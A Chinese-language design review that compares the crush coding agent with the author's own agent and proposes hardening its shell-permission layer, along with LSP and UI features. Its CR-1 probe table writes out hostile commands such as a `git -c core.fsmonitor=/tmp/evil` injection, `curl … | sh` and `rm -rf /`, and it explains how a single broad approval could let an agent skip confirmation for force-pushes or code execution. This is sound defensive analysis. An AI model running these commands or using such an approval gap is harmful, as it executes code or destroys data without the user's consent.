# Crush（Charm）借鉴清单

- 分析时间：2026-11-01
- 来源仓库：`D:\code\github\crush`（分支 `main`，HEAD `7f418090`；`go.mod` 声明 `go 1.27.0`，模块 `github.com/charmbracelet/crush`）。规模（本轮亲自数过）：`internal/` 下 **51** 个一阶包、**854** 个 `.go` 文件、非测试 **116,461** 行、测试 **77,135** 行、**363** 个 `.golden`。复跑命令见第六节。
- 对照仓库：本仓 `loop-reliability-docs` @ `51201b6445`，版本 `2.2.0-fork.11`
- **本文只做分析，未改任何代码。**（复核期间在 `packages/core/` 落过一个临时探针脚本，跑完即删；仓库无残留。）
- 证据分级：**[对方实测]** = 本轮我直接在 crush 文件里读到并复述其内容；**[实测]** = 本轮我亲自打开本仓该文件/在该包内跑过命令并复述结果；**[转述]** = 子代理报告、我未逐行复核（动手前必须复核）；**[UNVERIFIED]** = 本轮搜索范围不足以断言存在或不存在。
- 对账声明：已与既有 16 份系列文档逐项对账 —— adm / kimi-code / codex（清单 + 技术方案两轮）/ ZCode / goose / aider / cline / gemini-cli / 五源合并稿 `借鉴技术方案-cline-gemini.md`（L1–L39、裁决 C1–C25）/ `P0-功能点摘要.md` / `P0-可执行技术方案.md` / codewhale / dsh-superagent / oh-my-pi / reasonix / OpenHands（清单 + P0 评分标注两轮）/ `优势对比清单.md` 台账 / `qoder-ui-界面分析报告.md`。**已在他轮立项的主题在第三节撤下并注明轮次**，只补 crush 侧事实；第四节是本轮明确不学（含 crush 踩过的坑作为反面证据）；第五节是对照时照出来的本仓事实，不是借鉴项。

---

## 一、结论框架

**1. 对手不是陌生人，但对照面天生不对称。** crush 是 Charm 在命名争议后 fork 早期 opencode（TS 版）并用 Go 重写的后代，Bubble Tea v2 + lipgloss v2 + fantasy + catwalk。因此两件事必须先说清：

- **它的 agent 循环内核本轮读不到。** 多步循环、工具并发执行、finish 判定都在 `charm.land/fantasy v0.45.1` 里，crush 只提供回调（`internal/agent/agent.go` 的 `sessionAgent.Run` / `PrepareStep` / `OnToolCall` / `OnToolResult`）。该依赖未 vendor 进仓。**任何「crush 的 loop 比我们强/弱」的判断本轮都无据，本文不做**——与 OpenHands 第一轮 §1 第 3 点同理。
- **它的外围工程确实厚。** 差异化集中在循环之外：一个内嵌 POSIX shell 解释器（`mvdan.cc/sh`）之上的 AST 级命令策略与 flag 策略表、完整可用的 LSP 运行时、被反复调优过的终端渲染缓存、pinentry/ssh-askpass 级别的终端接管、后端进程生命周期治理。这些是本轮的对照面。

**2. 逐条核完之后的排序仍然很陡，真正的增量只有三件半。**

- **CR-1：持久许可的 key 只看 token 前缀，不看 flag**（P0，本轮唯一必须做的）。这不是「crush 有个好功能」，是**本轮实测照出来的本仓真实形状**：一次普通的 `git push origin/main` 批准会落盘 `git push *`，之后 `git push --force` 不再问；一次 `git -c …` 形式的批准会落盘 `git -c *`，之后 `git -c core.fsmonitor=<路径>` 被永久记住——而 `danger.ts` 对这些返回 `safe`。crush 用一张 `gitCodeExecFlags` + `allowFlags/denyFlags/requireFlag` 表把这一刀钉死，注释写得很直白：*仓库自己选了执行什么*。
- **CR-2：把「问不问」和「拦不拦」拆成两轴**（P1）。crush 的 `Yolo` 免提问但**执行时仍查黑名单**，`Sysadmin` 才两轴一起关。我们只有 `ask / auto / full` 三档，而 `full` 是 escalation 的唯一 opt-out——于是「不要问我常规操作，但 `rm -rf $TARGET` 还是要拦」这类人**没有档位可选**：要么一路问（auto），要么连危险形状都不问（full）。
- **CR-3：LSP 运行时**（P1，最大一块，也是本轮唯一的新方向）。crush 有完整实现（惰性启动、诊断回灌进 `edit`/`write` 的工具结果、7 个模型工具、header 错误徽标）。**我们的配置面与 UI 面都已就位，只有运行时缺席**：`ConfigLSP.Server` 有 schema、`normalize.ts` 会解码、GUI 有 LSP 服务分区并有 e2e 断言，而 `file-mutation.ts` / `edit.ts` / `write.ts` 各留一条 `TODO: … after LSP runtime exists`。这是「半条腿」而不是「没想过」。
- **半件：CR-4 模型自诊断工具**（`crush_info` / `crush_logs` 的形状，P2-，小）。

**3. 其余大多是「我们已有更强形式」，逐条点名（不进借鉴项）。**

- **工具输出溢出**：crush 的 bash `TruncateOutput` 保留头尾并把全量落文件、在提示里给出路径，还 60s 自动转后台。我们同形且更早：`tool/plugin/shell.ts` 的工具描述里写着 "the full result is saved to a file and a truncated preview is returned"，`background` 参数、`backgroundResult()` 的 "Command moved to the background (shell ID…)"、`jobs.background()` 全在。**不是借鉴项。**
- **崩溃/取消的结算**：crush 的 `settle.go settleTurn` 给每个未回答的 tool call 合成一条按原因分类的错误结果（`turnEndReason`：cancel / error / max-tokens / content-filter / abandoned），恢复靠读时修（`ListSettledMessages` + `repairInterruptedToolCalls`）。我们是**写时**就有：`runner/step.ts` 的 `publisher.failUnsettledTools(TOOLS_INTERRUPTED | RESULT_MISSING)` + `failIncompleteTools()`，运行前还有 `runner/llm.ts` 的 `settleStaleToolCalls` / `settleStaleCompactions`（`doc/session-loop.md` 的 "Recovery claims and stale settlement" 已记）。并且我们的邻接是**结构性**的——`runner/to-llm-message.ts` 把 `toolCall` 与 `toolResult` 生成在同一条消息的 content 里，不存在 crush 注释里那种「并发写入把 result 甩到别处，Kimi/DeepSeek 这类严格邻接的 provider 直接把会话永久锁死」的窗口。但请求构造器本身**没有局部守卫**，这一格由另外两道机制兜着，细节见 §五.6。
- **max-steps**：crush **没有**步数上限（子代理 grep `maxSteps|MaxTurns|step.limit` 无命中）；我们有 `runner/max-steps.ts`。
- **MCP 首条消息阻塞**：crush 的教训是交互轮绝不等待 MCP init（注释：阻塞曾把 TUI 冻到最慢服务器的连接超时）。我们本来就是异步的——`mcp/index.ts` 的注释 "Initial connections stay asynchronous so one slow server does not block Location startup"，且 `startup.await` 只出现在**真正调用**的那几个方法（`callTool` / `prompt` / `resources` / `readResource`）里。
- **模型目录三级回退**：crush 是 remote catwalk → 缓存文件 → embedded 快照 + ETag 重校验。我们 `plugin/models-dev.ts` 的注释直接写着冷缓存时"served the bundled snapshot"。**等价。**
- **provider 缓存亲和**：crush 用 XXH3 `HashID` 做 session header + 在 system/最后两条/最后一个工具上打 `cache_control: ephemeral`。我们有 `session/affinity.ts` 的 `SessionAffinity.get`（子会话沿用父/fork 的 ID）+ `openai.ts` / `chatgpt.ts` / `github-copilot.ts` 的 session-id / X-Interaction-Id 头 + `provider/prompt-cache-key.ts` 的逐 provider 白名单。**等价**；断点位置作为事实并入 L17。
- **终端 passphrase 接管**：crush 的 `pinentry`（25 文件）+ `sshaskpass`（8 文件）解决「TUI 拥有终端而 gpg/ssh 的对话框不是 shell 命令的子进程」。我们已有 `packages/cli/src/ssh-askpass.ts` 与 `index.ts` 里的 `OPENCODE_SSH_ASKPASS_PORT` 分支（含测试）。crush 的 gpg loopback + TIOCSTI 修复是 Linux 特化的一层，本轮不立项。
- **技能体系**：crush 是懒加载索引 + `crush://` 内嵌内置技能 + 来源标注 + `Deduplicate` 后者胜。我们 `tool/plugin/skill.ts` 已是懒加载工具，`skill/discovery.ts` 还能从远端 `index.json` 拉目录（带同源校验），提交 `08aef689be` 已做指令池预算与技能冲突披露。**我们更广。**
- **工程闸门**：crush 用 `git diff --exit-code` 守 `go.mod/go.sum`、`schema-update.yml` 自动重生成并提交生成物、grype `severity-cutoff: critical` + govulncheck + dependency-review 的 license 白名单、release 任务在 tag 前要求 build 与 snapshot 两条 workflow 对 HEAD 皆绿。我们已有 `check:generated`（`check-test.yml` 两步）、`bot-nix-hashes.yml` 以 PR 形式保鲜、actions 按 commit SHA 固定 **[实测：`check.yml` 里 `actions/checkout@34e114876b…]`**。crush 独有的是**tag 前置闸门**，本轮不立项，只在 §五 记一条待核（`script/release.ts` 是否已有等价前置，我没读）。

**4. 一条必须说出口的取舍。** CR-1 与 CR-2 都动权限层，而权限层的折叠语义已经被两轮明确否决过（C14：`never>always>ask` 最严者胜会否掉 explore 子代理与 Plan 模式；C23：审批决定不升格为 durable 事件）。**本轮两项都不碰折叠、不碰事件词汇**：CR-1 只改 `save` 字符串的生成形状，CR-2 只新增一种会话 ruleset 形状。这条边界要在动工前写进 `doc/permissions.md` 的 Decisions，否则下一个改动者会以为我们在重开那场争论。

---

## 二、可借鉴项（按 价值/代价 排序）

### CR-1 「总是允许」的 key 只按 token 前缀，flag 全盲 【P0】

**它的机制** **[对方实测 + 转述]**

`internal/agent/tools/safe.go` 为每一条「可跳过提问」的命令形态声明 flag 级策略，字段是 `restrictFlags / allowFlags / denyFlags / requireFlag / allowOperands`（`entry` 结构体）。入表门槛写在 `safeCommands` 的注释里：**该命令不能写文件系统、不能改仓库或系统状态、不能再执行程序、不能上网；任何「只读命令在某个 flag 下变破坏性」的形态要么带上受限 flag 集，要么整条不入表**。最硬的一张表是 `gitCodeExecFlags`，我亲读了它的定义与注释：

```go
// gitCodeExecFlags are flags that make an otherwise read-only git subcommand run a
// program or write a file: external diff drivers, pager handoff, and explicit output
// redirection. … --textconv sits here for the same reason as --ext-diff: both run a
// program named by the repository's own config, so a repository the user cloned but
// does not control chooses what executes.
```

清单是 `--ext-diff`、`--textconv`、`--open-files-in-pager`、`-O`、`--output`、`--output-indicator-new`、`--upload-pack`、`--receive-pack`、`--exec`，逐条挂在 `git blame/describe/diff/grep/log/ls-files` 上。另有两处 **[转述]**，动手前要复核：`requireFlag` 的存在理由（`git branch <name>` 会**创建**、`git remote add` 会写，所以 `allowOperands: false`）、以及 bash 授权 key `GrantKey` 把「总是允许」钉到**具体命令**而不是 cwd（"approving `ls` doesn't approve `sudo`"）。

**我们的现状** **[实测，含我跑出来的探针]**

保存形状由 `packages/core/src/shell/parse.ts` 决定：`save: \`${prefix(tokens).join(" ")} *\``，`prefix()` 从 `ARITY` 表里找**最长命中的前缀键**并取该 arity 的 token 数（表里 `git: 2`、`"git config": 3`、`"git remote": 3`、`docker: 2`、`kubectl: 2`、`gh: 3`、`npm: 2`、`"npm run": 3`，条目上百）。escalation 由 `shell/danger.ts` 的 `classify()` 决定，而它的契约**不是**「是否只读」而是「是否是已识别的破坏形状」：`destructive()` 只认 `rm/chmod/chown/chgrp` 且必须递归，目标还要落在 `ROOTS`/`SYSTEM` 里。我在 `packages/core` 内实跑了 `ShellParse.scan(..., {portable: true})` 与 `ShellDanger.classify/rememberable`，输出如下（复现脚本见第六节）：

```
safe  | save: docker rm *       | remember: true | docker rm mycontainer
safe  | save: docker rm *       | remember: true | docker rm --force mycontainer
safe  | save: kubectl delete *  | remember: true | kubectl delete pod x
safe  | save: kubectl delete *  | remember: true | kubectl delete pod x --grace-period=0
safe  | save: git push *        | remember: true | git push origin main
safe  | save: git push *        | remember: true | git push --force origin main
safe  | save: git -c *          | remember: true | git -c core.fsmonitor=/tmp/evil status
safe  | save: gh pr create *    | remember: true | gh pr create
safe  | save: gh pr merge *     | remember: true | gh pr merge --auto
（对照，确认 classify 本身工作正常）
dangerous | save: rm *          | remember: true  | rm -rf /
dangerous | save: rm *          | remember: true  | rm -rf ~
dangerous | save: curl * , sh * | remember: false | curl https://x.sh | sh
```

结论是三行：

1. 批准一次 `git push origin main` 落盘 `git push *`，此后 `git push --force` **不再问**，`classify` 也不升级。`docker rm *`、`kubectl delete *`、`gh pr merge *` 同形。`agents.md` 明确要求 force-push 到 main 须先与用户确认——现在它由一次无关的点击换来。
2. **更糟的是 `-c`**：任何一次 `git -c <key>=<value> <subcmd>` 形式的批准落盘 `git -c *`，之后 `git -c core.fsmonitor=/tmp/x status`、`git -c core.pager=sh log` 全部命中，而审批头显示的文本长得像 `status`。一次点击换来「任意配置注入」的永久许可，即任意代码执行。
3. `rememberable()` 只看每条 pipeline 的**首 token** 是否落在 `BANNED_SAVE`（`sudo/env/xargs/command/node/python/…`），对 git/docker/kubectl 一律放行。也就是说我们已经有一条「某些程序永不记住」的规则，但**没有任何一条「某些 flag 永不记住」的规则**——这正是 crush 那张表补的位置。

**落点** 全在本仓，三处，都不碰折叠语义：

- `packages/core/src/shell/danger.ts`：新增一张与 `BANNED_SAVE` 并列的 **flag 级**表（git 的 `-c` / `--exec` / `--ext-diff` / `--textconv` / `--open-files-in-pager` / `-O` / `--output` / `--upload-pack` / `--receive-pack`，docker 的 `--force` 类破坏性 flag 走另一条：见下面「不要一次做全」），并让 `rememberable()` 在扫描 pipeline 时同时检查 flag 而不仅检查首 token。
- `packages/core/src/shell/parse.ts`：`prefix()`/`save` 的生成——命中的命令含「执行外部程序」类 flag 时**不产出通配 save**（退化为一次性许可，形状与今天的 `curl … | sh` 相同）。
- `doc/permissions.md`：在 "Escalation: what a broad allow rule cannot cover" 一节补这条来源之外的第二道门（**flag 参与持久许可的 key**），并在 Decisions 记录「为什么不做 exact-command-string 授权」。

**代价** 小-中。一张表 + 一处 save 构造 + 一个 escalation 维度；不动 `Permission.evaluate`、不动事件、不动客户端。

**验收**（按可证伪写）：

- 上表 9 条探针里的 `git -c *` 与 `git push *` 两种保存形状必须变成「一次性许可」或「不含破坏 flag 的更窄前缀」，以测试固化在 `packages/core`（现在是口头结论，没人会再跑一遍）。
- 端到端：`bun run dev:live` 里批准 `git push origin main` 的「总是允许」，再让模型跑 `git push --force-with-lease` → **必须仍问**。注意本清单只测到了 classify/save 两层，**这条端到端我还没跑**（见第七节第 1 条，它会决定本项降级还是成立）。
- 反向不误伤：`git status`、`git diff`、`ls -la`、`npm run build` 的「总是允许」仍然落盘且第二次不问。

**风险** 三条，都要写进方案：① 变严会推高提问次数（`git -c` 现在被用户当普通命令批准），所以 key 的形状应该是「**flag 集相同即命中**」而不是整条命令串逐字符匹配——crush 的 exact-command grant 换来的抱怨是「`ls` 每次换参数都要问」[转述]，别照抄那一半。② `ARITY` 是白名单式的启发表，`git -c` 的 arity 恰好是 2 才产出 `git -c *`；改动要保证「未知 arity（1 token）」的降级路径不引入新的过窄。③ 与 §一.4 的边界：这条**不是**「最严者胜」，不要顺手改 `findLast`。

**不要一次做全**：flag 表先只覆盖「让只读命令执行外部程序或写文件」这一类（crush 的 `gitCodeExecFlags` 语义），`--force` 这类「已授权动作的强度升级」留作第二个 PR，因为它牵涉「用户批准过 `docker rm` 是否就等于批准过强删」的产品判断，不该和 git 代码执行混在一个改动里。

---

### CR-2 两轴审批：一个「不问但仍拦」的档位 【P1】

**它的机制** **[对方实测 + 转述]**

`internal/permission/permission.go` 把审批拆成两个独立维度：**问不问**由 `PermissionMode{Normal, Yolo, Sysadmin}` 的 `SkipsPrompts()` 决定；**拦不拦**由代码持有的 `defaultBlockedCommands` / `resolveBlockedCommands` 在**执行时**再查一次，条件是 `check.Matched && mode != Sysadmin`。也就是说 Yolo = 免提问但仍受黑名单约束，只有 Sysadmin 关掉全部检查（其自述 "nothing is checked at any point"），入口是 `-yy` 加一条 `sysadminModeWarning`。`Request()` 的求值顺序是：mode → 配置 `allowedTools` → hook 预批 → per-session grant → 发提问。另外 `resolve()` 明确**信服务端记录而非客户端回显**（防多客户端伪造），这一点是 L31 那一族。

**我们的现状** **[实测]**

`packages/app/src/session/composer/permission-mode.ts`：`type PermissionMode = "ask" | "auto" | "full"`，`MODES = ["ask","auto","full"]`；`ruleset("auto")` = `[{*,*,allow}]` 之后接 `RISKY_ACTIONS = ["edit","shell","external_directory","webfetch","websearch"]` 的 `ask` 与 `RISKY_READS = ["*.env*"]`；`ruleset("full")` = **单条 `{*,*,allow}`**。`doc/permissions.md` 把这条写成了本仓的不变量：

> `evaluateInput` is **deny → escalation → allow** … The only thing that clears it is a session that allowed everything outright, which is a standing choice the user made on purpose.

于是缺口很清楚：**我们没有「免提问但仍拒危险形状」这一档。** 想要它的人只能选 auto（`shell` 每步都问，失去无人值守的意义）或 full（`rm -rf /` 都不问）。crush 的 Yolo 正好是中间那一格。附带一条：crush 的「执行时复筛」我们也缺——`tool/plugin/shell.ts` 在审批之后只复查工作目录（注释 "Approval can outlive the directory"），不复查命令本身是否已变危险；这不是本项的必须内容，但值得在同一轮里记一句。

**落点** `permission-mode.ts` 新增一档（其 ruleset 仍是 `{*,*,allow}` 但**不带**「本会话主动放弃全部」的语义标记），因此必须同时改 `Permission.evaluate` 里那条「session 自身 rules 含全量 allow 即豁免 escalation」的识别——建议做法是让这一档写入一条**可区分的标记**（例如独立的会话字段或专用 action 名），而不是靠 ruleset 文本猜测；`doc/permissions.md` 的三档表与 Decisions 同步；TUI/desktop/CLI（`--auto` 语义）三处入口一致。

**代价** 中。改动本身小，**但它要重写一条已写下的不变量**（full 是唯一 opt-out），所以必须带 Decisions 记录与三端一致性测试。

**验收** 新档下：`git status` 不问、`rm -rf $TARGET` 仍问、`curl x | sh` 仍问、`git -c core.pager=sh log` 在 CR-1 之后仍问；`full` 档行为逐字不变；`modeOf()` 对旧会话 ruleset 的判读不被新档污染（`same()` 是按 JSON 数组严格比较的，新增一档要确认不会让既有会话被判成 `custom`）。

**风险** ① 别把这一档放进循环按键里（见 §四.6，crush 把 Sysadmin 塞进 Shift+Tab 环是反面例子）。② 非交互 `opencode run` 的语义要定清楚：`doc/permissions.md` 已写「无法提问时 escalation 命令直接失败」，新档若也免提问，就要明确它是「仍然拒」而不是「静默放行」，否则等于第二个 full。

---

### CR-3 LSP 运行时：诊断回灌与一组模型工具 【P1，最大的一块】

**它的机制** **[对方实测（结构）+ 转述（细节，动手前复核）]**

`internal/lsp`：默认服务器目录来自 powernap 的 `LoadDefaults`，用户 `lsp` 配置覆盖（`disabled → RemoveServer`，其余 `AddServer`）。**惰性、按被触碰文件启动**：`Manager.Start(path)` 由 `handles()` / `canAutoStart()`（root markers）门控，另有一张 `skipAutoStartCommands` 拒绝清单（约 28 条通用命令，如 `node`/`python`/`deno`）**永不自动启动**；`options.auto_lsp=false` 关掉非用户配置项的自动启动。init 用 detached context + 30s 超时；失败路径是 `slog.Error` 后删除 client，日志写 "not fully ready, continuing anyway"，`unavailableRetryDelay = 30s`。回灌：`tools/edit.go`、`tools/write.go` 调 `notifyLSPs` 再把 `getDiagnostics()` **追加到工具结果**。模型面 7 个工具（`lsp_diagnostics` / `references` / `symbols` / `definition` / `call_hierarchy` / `rename` / `replace_symbol`）+ `lsp_restart`，经 `SetCallback` 动态加入；`view` 打开文件后等 300ms 诊断。UI：header 的 LSP 错误数徽标（`drawHeader`，注释说 "drawing runs on every frame and must not probe the workspace"，计数预算好传进来）。

**我们的现状** **[实测]**

配置面**已有**：`packages/schema/src/config/lsp.ts` 定义 `ConfigLSP.Disabled / Server / Entry / Info`（字段 `command`、`extensions`、`disabled`、`env`、`initialization`），`packages/core/src/config/normalize.ts` 真的会解码 `lsp` 键（布尔或 map 两种形态，带 diagnostics）。UI 面**已有**：`packages/app/e2e/regression/session-summary.spec.ts` 把 "LSP" 当一个服务分区在测——断言 `No LSP servers configured`、配置项 `typescript` 可见、`rust`（disabled）被过滤，并且 `session-service-dot` 的 `toHaveCount(0)`。**运行时没有**：全仓（`packages/*/src`，排除 node_modules/i18n/dist）里除 normalize 与上述测试外无消费者；`packages/core/src/file-mutation.ts`、`tool/plugin/edit.ts`、`tool/plugin/write.ts` 各留一条 TODO（"Notify LSP and collect diagnostics after LSP runtime exists" / "Add LSP notification and diagnostics after LSP runtime exists"）。`doc/` 的 7 个主题文档里也没有 LSP 一节。

与既有轮次的关系：合并稿 **L29** 把「未来 LSP diagnostics」列为结构化块预算二分的**第四客户**，也就是说前几轮只把 LSP 当作下游，**没有任何一轮立项过生产方**。本轮立项生产方，L29 侧无需改动。

**落点**（三个可独立回滚的 PR，按此顺序做）

- **M-a（小-中，先做）**：新增 Location 作用域的 LSP 服务（遵守 `agents.md` 依赖方向 Schema → Core → Server；与 `SessionRunner`、tool registry、permissions、filesystem 一样 Location 作用域）。范围只做「诊断回灌」：`edit` / `write` / `patch` 完成后取当前文件诊断，按稳定文本追加进工具结果；同时消费 `ConfigLSP.Server`（终结 §五(a) 的死配置状态）；并在 `doc/` 新增 `doc/lsp.md`，按 `doc/conventions.md` 的 change map 加一行索引。**必须带预算上限**（诊断文本进上下文，与 L29 的客户关系在这一 PR 里定死），以及「无 LSP 环境时不得出现空结果或超时」——LSP 缺位不能变成工具失败。
- **M-b（中）**：`lsp_diagnostics` + `lsp_references` 两个模型工具起步（`definition` 视需要），走现有 tool registry 与 permission action；不一次上七个（工具表面预算归 L18/L30，已立项，别在这一 PR 里重开）。
- **M-c（大，可长期搁置）**：默认服务器目录 + 惰性启动。若做，两条纪律不可省：① **照抄那张「通用解释器命令永不自动启动」的拒绝清单**；② **失败必须可见**——crush 的 `slog.Error` + 静默删 client + "continuing anyway" 不复制（本仓 `优势对比清单.md` 里 kimi 文档与代码互斥、检查脚本死掉就是同类反例）。

**代价** M-a 小-中；M-b 中；M-c 大（进程生命周期、Windows 进程树与 OEM 码页那条 L15 已立项、每语言安装差异）。

**验收** M-a：故意写错一个 TS 文件，`edit` 结果里必须带诊断文本与稳定锚点，`bun run lint`（含 `script/doc-refs.ts`）过；GUI 的 LSP 分区状态点开始有真实值（那条 `toHaveCount(0)` 断言要随之改写，这是「行为变了、测试也要变」的正常一处）。M-a 起每轮首步延迟不得上升——用 `bun script/session-efficiency.ts` 对同一 prompt/同一模型/同一输出量前后各跑一次（性能验证纪律）。

**风险** ① 启动成本直接打在必须保留的体验上（本仓硬要求：输入框下方实时 tok/s、缓存命中、上下文占用）。若诊断回灌把首步拖慢，就退化为「只在 edit/write 之后回灌，不在步首探活」。② 静默失败与虚假承诺：配置能写但运行时缺席**已经是**当前状态，M-a 之前的正确做法是先按 §五(a) 把「配置可写、当前无效」写进文档，而不是让 e2e 继续假装它是一个活的分区。③ 别把 LSP 变成第二个 MCP 进程泥潭——L16 那一轮的进程卫生与诚实分类直接复用。

---

### CR-4 模型自诊断：`crush_info` / `crush_logs` 的形状 【P2-】

**它的机制** **[对方实测]**

我亲读了两个工具文件。`internal/agent/tools/crush_info.go` 的 `buildCrushInfo(cfg, lspManager, allSkills, activeSkills, skillTracker)` 把「哪些配置文件被加载、LSP 管理器状态、全部/启用/已加载的 skills」拼成一段文本作为工具响应；工具描述来自同目录 `//go:embed crush_info.md`。`internal/agent/tools/crush_logs.go` 用 `crush_logs.md.tpl` 模板把 `defaultLines` / `maxLines` **渲染进工具描述**（描述里的数字与实现常量同源，不会漂），再 tail 应用日志。crush 的 `AGENTS.md` 把这条写成约定：工具自文档，`.go` + `.md` 成对。

**我们的现状** **[实测]**

`packages/core/src/tool/plugin/opencode.ts` 已向模型暴露 `models`、`session_rename`、`session_move`、`worktree_list/create/remove`（`Plugin` 对象里逐个 `name:`），**没有**「读自己的状态/日志」。人看的诊断在 `packages/tui/src/component/devtools-bar.tsx`（含 `theme-performance` 分组与进程采样）。

**落点** 在 `opencode.ts` 的同一插件里加两个**只读动作**（不新开工具名，避免撞 L18/L30 的表面预算）：一个汇总「已加载配置来源 + MCP 服务器状态 + 技能启用/已加载 + 当前 agent 规则」，一个带行数上限的日志尾部。行数常量按 crush 的做法**渲染进描述**而不是写两遍。日志读取必须先过脱敏——复用 **L37** 的双策略脱敏，不另起一套。

**代价** 小。**验收** 典型提问「我的 MCP 服务器为什么连不上」，模型一次工具调用即得答案，而不是猜或跑 `ps`；读取量计入 `doc/context-economics.md` 的裁剪统计。**风险** 日志含绝对路径与凭据回显；以及「模型能读自己的日志」会不会诱发把日志当上下文倾倒——沿用工具输出溢出规则即可。

---

### CR-5 子进程 16 色输出：重映射，不是抹平 【P2】

**它的机制** **[转述]** `internal/ui/common/ansi16.go` 的 `RemapANSI16` 把子进程输出的原始 16 色 SGR 改写成主题 RGB；`styles/palette.go` 的 `Palette` 里带**完整的 16 色重映射集**（`ansi_black … ansi_bright_white`）作为语义 token；`capabilities.go` 存 `colorprofile.Profile`，降级交给 colorprofile/lipgloss 而非手写。

**我们的现状** **[实测 + 一处 UNVERIFIED]** `packages/tui/src` 内 grep `ansi16|color.?profile|truecolor|16.?color` **零命中**；出现的是**剥离**：`component/dialog-shell-output.tsx` 用 `stripAnsi(output())` 并把 CRLF 归一，`attention.ts` 用 `stripAnsi`，`component/prompt/index.tsx` 用 `stripAnsiSequences`。也就是我们对子进程颜色的现行策略是「抹平」。**内联工具输出到底也走剥离，还是原样透传进 OpenTUI 文本节点，本轮未测**——这是本项唯一的前置动作。

**落点** 先测（用 TUI story 喂一份含 `ESC[31m/34m/90m` 的 fixture，窄/宽 + 深浅主题各看一次；story 纪律见 `agents.md`）。若确认是「原样透传」或「抹平」，再按 `agents.md` 的 **TUI Theme Tokens** 纪律走：本仓明确禁止「为好看借用无关语义 token」，所以要先扩主题 schema/defaults/resolution/types 并验浅色、深色与自定义主题回退路径，**然后**才在组件里使用这组新角色。这一族与 **OH-5**（主题跨渲染器穷举映射守卫）相邻，本项只主张「新增一组语义角色」，穷举守卫不重复立项。

**代价** 小（一张映射表）+ 主题 schema 扩面（四处 + 两条主题回退验证）。**验收** 同一份 ANSI fixture 在深/浅主题下都可读；颜色语义（红=错误、黄=警告）不再靠运气。**风险** 别把它做成「保留原始 SGR」的透传——那在浅色主题下直接不可读；也别为省事直接改 `theme.hue`。

---

### CR-6 渲染代价三件：帧缓存 / 冻结条目 / 输入合并 【P2，条件项，先测再排期】

**它的机制** **[转述，未逐行复核]** 三处（`framecache.go`、`list/item.go`、`model/filter.go`）我确认了文件与符号存在，语义来自子代理：整帧 memo，key 是把滚动偏移、选择、`ItemsVersion` 折成一个版本号的 `RenderState`，LRU 32 + 3s TTL 安全阀 + `markScrollOnly` 只对滚动做增量；条目级 `Item.Finished()` 冻结契约——终态条目不再调用 Render，直到宽度变化/显式解冻；输入在 Update **之前**用 `tea.WithFilter` 合并滚轮与鼠标移动样本（16ms/60Hz 聚合）；`Chat.BeginResize/WarmStep` 拖拽期只重排可见项、之后按帧分批预热（每步 25 条）。

**我们的现状** **[实测：机制不同，孰优未测]** 渲染栈是 `@opentui/core` + `@opentui/solid`（`packages/tui/package.json`）。两处我们**已强于** crush 的做法：markdown 走 `MarkdownRenderable` + `getTreeSitterClient()`（增量解析，胜过「稳定前缀 + 整段重渲尾部」那套），`packages/tui/src/mini/scrollback.surface.ts` 的头注释写明 "Retained surfaces keep streaming markdown/code layout stable and wait for image loads before their snapshots enter scrollback"——即「终态快照化」的概念我们已有。**帧级 memo 与「已结束条目零重渲染」的版本折叠是否存在等价实现，本轮未证**，因此这一项**在证据补齐前不排期**。

**落点** 只做度量：`bun run dev:live` + `OPENCODE_STORY` 造一个数百条消息的 fixture，滚动与 resize 时看 CPU（`script/session-efficiency.ts` 量的是循环，不量渲染，需要另配 renderer 侧计时；`devtools-bar.tsx` 的 `theme-performance` 分组是现成的采集口）。量出「滚动/resize 触发整列表重算」才谈冻结条目契约；量不出就撤掉本项。

**验收（即度量本身）** 窄/宽终端下每帧成本与列表长度的关系曲线；流式期间每 token 成本。**红线**：不得为了缓存牺牲必须保留的 tok/s、缓存命中与上下文显示（本仓记忆里的硬要求），也不得把 durable 事件语义拉进渲染层。

---

## 三、已在他轮立项，本轮撤下（只补 crush 侧事实）

1. **「看过才准覆盖」的写准入** —— **reasonix 清单第 1 项**已立项。crush 是第二例但**更弱**：`internal/filetracker`（`read_files` 表）用 `mtime > LastReadTime` 比较，`edit`/`write`/`multiedit` 都拒绝未读或已陈旧的写；**没有内容指纹，也不区分完整读与分页读**。→ 补事实：reasonix 方案里「只有完整读才刷新观察」这条在 crush 中不存在，实现时别以为两家都这么做。
2. **通用重复/空转熔断** —— **L1**（合并稿）已立项，并且**本仓已经落地**：`packages/core/src/session/runner/loop.ts` 的 `decide(messages)` 从 durable 历史折叠出四类判据（`repetition()` 的 `WINDOW=25 / MAX_PERIOD=5 / REPEAT_LIMIT=5`、`declinedRun()` 的 `DECLINE_LIMIT=8`、`REJECT_LIMIT=3`、`MALFORMED_LIMIT=3`），模型可见契约 token `LOOP_GUARD`，开关 `experimental.loop_guard`，`doc/session-loop.md` 已有专节，`session-runner-loop.test.ts` 当纯折叠测覆盖。落地在提交 `08aef689be`（"stop runaway turns"）。**所以这里只剩两条 crush 侧的对账事实，且都是我们更强：**
   - crush 的 `loop_detection.go hasRepeatedToolCalls(steps, 10, 5)` 只找 **period=1**（同一签名在最近 10 步里重复 >5 次）；我们的 `repetition()` 明确扫 `period 1..5`，注释写着 "`k = 2` is `A B` alternating five times, which a same-call counter cannot see and which is the shape a model actually spins in when it toggles between two files"。**交替空转 crush 看不见。**
   - crush 的签名是 `(toolName, input, resultOutput)` 的 SHA-256，**用原始输出文本**。而它自己的 bash 会把超限输出溢出到文件并在提示里写出该文件路径（`TruncateOutput`），路径每次调用都不同 —— 于是「同一个超限搜索跑第五次」在 crush 里输出文本永远像新信息，period=1 也触发不了 **[转述：触发条件由子代理报告，我未亲跑]**。我们专门处理了这一格：`CLIPPED` 正则把 `[showing … full output saved to …]` 折叠成 `[clipped output]`，注释写得很清楚 "Folding the path away is what lets the same oversized search look identical on the second run instead of forever looking like new information"。
   - → **本项对 L1 无新增要求**。反过来，`优势对比清单.md` 的那三条「零命中 = 无通用断路器」需要更正，见 §五.5。
3. **危险命令 AST 判定与 fail-closed** —— **L12 / L21** 已立项。crush 的 `tools/safe.go isSafeReadOnly` 要求整条 argv 全字面量，遇重定向、后台、赋值、展开、任何反斜杠一律不算只读；注释「`echo` 只因拒绝重定向才算安全，加了重定向就是任意文件写」。**本轮不重开折叠争论**，CR-1 只取「持久许可的 key 形状」这一刀。
4. **prompt cache 字节确定性与断点** —— **goose §3.6→L17 / codewhale §3.4→L30** 已立项。crush 补一条事实：Anthropic/Bedrock/Vercel 的 `cache_control: ephemeral` 打在 system、**最后两条消息**、**最后一个工具**上（`getCacheControlOptions`）。L17 落阶段时按这三个位置核对我们的断点策略。
